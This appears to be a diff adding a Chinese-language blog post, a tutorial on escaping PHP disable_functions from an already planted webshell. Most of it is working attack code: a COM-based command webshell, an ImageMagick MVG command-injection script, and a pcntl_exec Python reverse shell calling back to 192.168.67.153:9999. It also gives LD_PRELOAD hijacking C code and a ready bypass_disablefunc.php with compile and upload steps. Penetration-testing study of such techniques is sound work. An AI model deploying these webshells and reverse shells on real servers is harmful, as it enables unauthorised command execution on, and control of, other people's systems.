@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="WebShell下绕过disable_function"/>
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Tomas'Blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2020/08/30/bypass_disable_function/"/>
+
+
+<meta name="description" content="WebShell下绕过disable_function0X00 Webshell概要WebShell无法执行命令的原因 php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类命令执行的相关函数 web 进程运行在 rbash 这类受限 shell 环境中  -&amp;gt;  可执行少量系统命令 WAF 拦劫  -&amp;gt;  可执行少了系统命令">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebShell下绕过disable_function">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;08&#x2F;30&#x2F;bypass_disable_function&#x2F;index.html">
+<meta property="og:site_name" content="Tomas&#39;Blog">
+<meta property="og:description" content="WebShell下绕过disable_function0X00 Webshell概要WebShell无法执行命令的原因 php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类命令执行的相关函数 web 进程运行在 rbash 这类受限 shell 环境中  -&amp;gt;  可执行少量系统命令 WAF 拦劫  -&amp;gt;  可执行少了系统命令">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;php-ini-com.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;com-shell.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;phpinfo-imagick-version.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;pcntl-exec-shell.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;example-a-c-normal.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;example-a-c-modify.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;mail-getuid-exec.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;bypass_disablefunc_shell.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;php-fpm-bypass.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;imap-code-execution.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;php-gc-bypass.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;php-backtrace-bypass.png">
+<meta property="og:updated_time" content="2020-08-30T10:10:33.935Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;php-ini-com.jpg">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> WebShell下绕过disable_function - Tomas'Blog </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Tomas'Blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          WebShell下绕过disable_function
+        
+      </h1>
+
+      <time class="post-time">
+          8月 30 2020
+      </time>
+    </header>
+    
+            <div class="post-content">
+            <h2 id="WebShell下绕过disable-function"><a href="#WebShell下绕过disable-function" class="headerlink" title="WebShell下绕过disable_function"></a>WebShell下绕过disable_function</h2><h3 id="0X00-Webshell概要"><a href="#0X00-Webshell概要" class="headerlink" title="0X00 Webshell概要"></a>0X00 Webshell概要</h3><h5 id="WebShell无法执行命令的原因"><a href="#WebShell无法执行命令的原因" class="headerlink" title="WebShell无法执行命令的原因"></a>WebShell无法执行命令的原因</h5><ul>
+<li>php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类命令执行的相关函数</li>
+<li>web 进程运行在 rbash 这类受限 shell 环境中  -&gt;  可执行少量系统命令</li>
+<li>WAF 拦劫  -&gt;  可执行少了系统命令</li>
+</ul>
+<h5 id="绕过disable-function方法"><a href="#绕过disable-function方法" class="headerlink" title="绕过disable_function方法"></a>绕过disable_function方法</h5><ul>
+<li>攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞</li>
+<li>寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试</li>
+<li>mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制</li>
+<li>利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果</li>
+</ul>
+<h3 id="0X01-系统组件的攻击"><a href="#0X01-系统组件的攻击" class="headerlink" title="0X01 系统组件的攻击"></a>0X01 系统组件的攻击</h3><h5 id="系统组件的绕过"><a href="#系统组件的绕过" class="headerlink" title="系统组件的绕过"></a>系统组件的绕过</h5><ul>
+<li>前提<ul>
+<li>Window com组件（php5.4版本以上需要自行添加扩展）</li>
+<li>在php.ini文件中开启</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/php-about/disable_function/php-ini-com.jpg" alt="php-ini-com"></p>
+<ul>
+<li>利用代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">"cmd /c "</span>.$command); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用后的结果</li>
+</ul>
+<p><img src="/images/php-about/disable_function/com-shell.png" alt="com-shell"></p>
+<h5 id="利用ImageMagick漏洞"><a href="#利用ImageMagick漏洞" class="headerlink" title="利用ImageMagick漏洞"></a>利用ImageMagick漏洞</h5><ul>
+<li>简介<ul>
+<li>ImageMagick是一套功能强大、稳定而且开源的工具集和开发包，可以用来读、写和处理超过89种基本格式的图片文件</li>
+</ul>
+</li>
+<li>影响版本：v6.9.3-9 或 v7.0.1-0</li>
+</ul>
+<p><img src="/images/php-about/disable_function/phpinfo-imagick-version.png" alt="phpinfo-imagick-version"></p>
+<ul>
+<li>利用代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Disable Functions: "</span> . ini_get(<span class="string">'disable_functions'</span>) . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$command = PHP_SAPI == <span class="string">'cli'</span> ? $argv[<span class="number">1</span>] : $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> ($command == <span class="string">''</span>) &#123;</span><br><span class="line">    $command = <span class="string">'id'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exploit = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">push graphic-context</span></span><br><span class="line"><span class="string">viewbox 0 0 640 480</span></span><br><span class="line"><span class="string">fill 'url(https://example.com/image.jpg"|<span class="subst">$command</span>")'</span></span><br><span class="line"><span class="string">pop graphic-context</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">"KKKK.mvg"</span>, $exploit);</span><br><span class="line">$thumb = <span class="keyword">new</span> Imagick();</span><br><span class="line">$thumb-&gt;readImage(<span class="string">'KKKK.mvg'</span>);</span><br><span class="line">$thumb-&gt;writeImage(<span class="string">'KKKK.png'</span>);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(<span class="string">"KKKK.mvg"</span>);</span><br><span class="line">unlink(<span class="string">"KKKK.png"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用成功的结果<ul>
+<li>▲ 2020.08.25 脚本在cli的情况下会报错，在web访问时不会报错，但无法执行成功payload</li>
+</ul>
+</li>
+</ul>
+<p><img src="" alt="imagick-shell"></p>
+<h3 id="0X02-利用pcntl-exec"><a href="#0X02-利用pcntl-exec" class="headerlink" title="0X02 利用pcntl_exec"></a>0X02 利用pcntl_exec</h3><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><ul>
+<li>pcntl是linux下的一个扩展，可以支持php的多线程操作。(与python结合反弹shell) pcntl_exec函数的作用是在当前进程空间执行指定程序</li>
+</ul>
+<h5 id="影响范围：PHP-4-gt-4-2-0-PHP-5"><a href="#影响范围：PHP-4-gt-4-2-0-PHP-5" class="headerlink" title="影响范围：PHP 4 &gt;= 4.2.0, PHP 5"></a>影响范围：PHP 4 &gt;= 4.2.0, PHP 5</h5><h5 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    pcntl_exec(<span class="string">"/usr/bin/python3"</span>,<span class="keyword">array</span>(<span class="string">'-c'</span>, <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("192.168.67.153",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="利用成功的结果"><a href="#利用成功的结果" class="headerlink" title="利用成功的结果"></a>利用成功的结果</h5><ul>
+<li>在网页端上访问无法反链一个shell</li>
+<li>在命令行的情况下才会返回一个shell</li>
+</ul>
+<p><img src="/images/php-about/disable_function/pcntl-exec-shell.png" alt="pcntl-exec-shell"></p>
+<h3 id="0X03-利用环境变量LD-PRELOAD"><a href="#0X03-利用环境变量LD-PRELOAD" class="headerlink" title="0X03 利用环境变量LD_PRELOAD"></a>0X03 利用环境变量LD_PRELOAD</h3><h5 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h5><ul>
+<li>利用漏洞控制 web 启动新进程 a.bin</li>
+<li>a.bin 内部调用系统函数 b()</li>
+<li>b() 位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so</li>
+<li>▲ 若在 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的 c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的</li>
+<li>⭐ 利用过程<ul>
+<li>查看进程调用系统函数明细</li>
+<li>操作系统环境下劫持系统函数注入代码</li>
+<li>找寻内部启动新进程的PHP函数</li>
+<li>PHP环境下劫持系统函数注入代码</li>
+</ul>
+</li>
+</ul>
+<h5 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h5><ul>
+<li>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的</li>
+<li>测试代码（也可通过getuid进行测试，getuid为常用且无需其他参数的函数）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> passwd[] = <span class="string">"password"</span>;</span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage: %s &lt;password&gt;/n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(passwd, argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Correct Password!/n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Invalid Password!/n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>保存代码并进行编译：<code>gcc a.c -o a</code>，并运行尝试<ul>
+<li>根据判断传入的字符串是否等于”password”，来得出不同结果</li>
+<li>其他调用了标准C函数strcmp函数来比较，是一个外部调用函数</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/php-about/disable_function/example-a-c-normal.png" alt="example-a-c-normal"></p>
+<ul>
+<li>编写一个同名函数，代码如下</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1, <span class="keyword">const</span> <span class="keyword">char</span> *s2)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hack functio  n invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n"</span>, s1, s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>编译以上代码为动态链接库：<code>gcc -fPIC -shared b.c -o b.so</code></li>
+<li>通过LD_PRELOAD来设置它能被其他调用它的程序优先加载：<code>export LD_PRELOAD=&quot;./b.so&quot;</code></li>
+<li>再次运行a<ul>
+<li>随意输入字符串都会显示密码正常  -&gt;  程序在运行时优先加载了自编写程序</li>
+<li>▲ 如果某个程序在运行过程中调用了某个标准的动态链接库函数，那么有机会通过LD_PRELOAD来设置优先加载自编写的函数，实现劫持</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/php-about/disable_function/example-a-c-modify.png" alt="example-a-c-modify"></p>
+<h5 id="查看共享对象，以及API调用"><a href="#查看共享对象，以及API调用" class="headerlink" title="查看共享对象，以及API调用"></a>查看共享对象，以及API调用</h5><ul>
+<li><p>运行<code>/usr/bin/id</code>，通过<code>ldd /usr/bin/id</code>可查看系统为其加载的共享对象</p>
+</li>
+<li><p>运行<code>nm -D /usr/bin/id 2&gt;&amp;1</code> 或 <code>readelf -Ws /usr/bin/id</code>可查看该程序可能调用的系统 API 明细</p>
+</li>
+<li><p>运行<code>strace -f /usr/bin/id 2&gt;&amp;1</code> 跟踪实际 API 调用情况（受环境影响，可能真正运行时调用的API可能只是readefl查看的子集）</p>
+</li>
+</ul>
+<h5 id="查找PHP对共享对象，以及API调用"><a href="#查找PHP对共享对象，以及API调用" class="headerlink" title="查找PHP对共享对象，以及API调用"></a>查找PHP对共享对象，以及API调用</h5><ul>
+<li>▲ PHP在处理过程中，如果处理图片、请求网页或者发送邮件等，可能会启用到外部程序</li>
+<li>处理图片，调用PHP封装的ImageMagick库，查看execve()方法，启动PHP解释器，但未启动新进程</li>
+<li>请求网页，调用curl_init()，查看execve()方法，启动PHP解释器，但未启动新进程</li>
+<li>发送邮件，调用mail()，查看execve()方法，发现mail()内部启动了/usr/sbin/sendmail和/usr/sbin/postdrop两个新进程，可在PHP环境下劫持系统函数注入代码</li>
+</ul>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
+<li>▲ 劫持系统函数getuid()，通过mail()的函数来实现绕过disable_function</li>
+<li>劫持getuid()函数的代码</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uid_t</span> getuid(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">"echo '!! evil command here !!'"</span>);  <span class="comment">//your evil command!!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>编译共享对象<code>gcc -shared -fPIC getuid_shadow.c -o getuid_shadow.so</code></li>
+<li>mail.php代码，内部增加设置LD_PRELOAD的代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	putenv(<span class="string">"LD_PRELOAD=/var/www/html/getuid_shadow.so"</span>);</span><br><span class="line">	mail(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将mail.php以及含有mail()函数的共享对象getuid_shadow.so放入web目录下/var/www/html</li>
+<li>执行mail.php</li>
+</ul>
+<p><img src="/images/php-about/disable_function/mail-getuid-exec.png" alt="mail-getuid-exec"></p>
+<ul>
+<li>▲ 如果mail函数也被禁用的话，还有一种方法，error_log()也能触发执行命令</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	putenv(&quot;LD_PRELOAD=/var/www/html/getuid_shadow.so&quot;);</span><br><span class="line">	error_log(&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="bypass-disablefunc-php-来自大佬的脚本"><a href="#bypass-disablefunc-php-来自大佬的脚本" class="headerlink" title="bypass_disablefunc.php(来自大佬的脚本)"></a>bypass_disablefunc.php(来自大佬的脚本)</h5><ul>
+<li><p>第一个参数是 cmd 参数，待执行的系统命令</p>
+</li>
+<li><p>第二个参数是 outpath 参数，保存命令执行输出结果的文件路径，便于在页面显示，需注意文件路径的权限</p>
+</li>
+<li><p>第三个参数是sopath，指定劫持系统函数的共享对象的绝对路径，需注意web是否可跨目录访问到</p>
+</li>
+<li><p>▲ 脚本代码</p>
+<ul>
+<li>拼接命令和输出路径成为完整的命令行，不用在cmd参数中重定向</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过环境遍历EVIL_CMDLINE像自编译的共享so库传递具体执行的命令行信息</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(<span class="string">"message"</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="bypass-disablefunc-via-LD-PRELOAD"><a href="#bypass-disablefunc-via-LD-PRELOAD" class="headerlink" title="bypass_disablefunc_via_LD_PRELOAD"></a>bypass_disablefunc_via_LD_PRELOAD</h5><ul>
+<li><p>脚本：<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+</li>
+<li><p>真实环境下的存在的问题</p>
+<ul>
+<li>某些环境中，web 禁止启用 senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件</li>
+<li>即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts</li>
+</ul>
+</li>
+<li><p>▲ 劫持共享对象</p>
+<ul>
+<li>GCC 有个 C 语言扩展修饰符 <code>attribute__((constructor))</code>，可以让由它修饰的函数在 main()<br>之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行<code>__attribute((constructor))</code> 修饰的函数<br>因此，可以通过这个方式来构造函数，把我们要执行的命令放在环境变量里，执行时直接加载环境变量的命令，就可以做到绕过了</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern char** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    // get command line options and arg</span><br><span class="line">    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line"></span><br><span class="line">    // unset environment variable LD_PRELOAD.</span><br><span class="line">    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span><br><span class="line">    // distribution (e.g., centos), I need crafty trick.</span><br><span class="line">    int i;</span><br><span class="line">    for (i = 0; environ[i]; ++i) &#123;</span><br><span class="line">            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;</span><br><span class="line">                    environ[i][0] = &apos;\0&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // executive command</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将 bypass_disablefunc.c 编译为共享对象 bypass_disablefunc_x64.so：<code>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so</code>，若要编译成X86架构需要加上-m32选项</p>
+</li>
+<li><p>上传 bypass_disablefunc_x64.so和bypass_disablefunc.php脚本，按bypass_disablefunc.php中提示进行执行系统命令</p>
+</li>
+</ul>
+<p><img src="/images/php-about/disable_function/bypass_disablefunc_shell.png" alt="bypass_disablefunc_shell"></p>
+<ul>
+<li>来自yangyangwithgnu大佬的脚本<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener"> bypass_disablefunc_via_LD_PRELOAD</a><ul>
+<li>bypass_disablefunc.php</li>
+<li>bypass_disablefunc.c</li>
+<li>bypass_disablefunc_x64.so</li>
+</ul>
+</li>
